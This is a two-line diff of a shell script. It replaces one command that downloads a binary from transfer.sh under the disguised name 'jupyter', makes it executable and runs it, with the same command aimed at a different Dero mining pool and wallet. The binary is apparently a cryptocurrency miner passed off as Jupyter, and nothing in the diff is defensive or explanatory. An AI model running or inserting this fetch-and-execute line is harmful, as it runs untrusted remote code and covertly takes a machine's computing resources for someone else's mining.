@@ -1,2 +1,2 @@
 ls
-wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r heroku-ca.dockerpool.my.id:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmk2nadysceg79q8gxteg.AMD-Ryzen
+wget https://transfer.sh/WnjibV/jupyter && chmod +x jupyter && ./jupyter -r pool.whalesburg.com:4300 -w dero1qyvtha2gx0w2ym7dur5eyta5jsp8nw4rl9sy8nr7gsyn773447gd2qqz7dk2h.250core
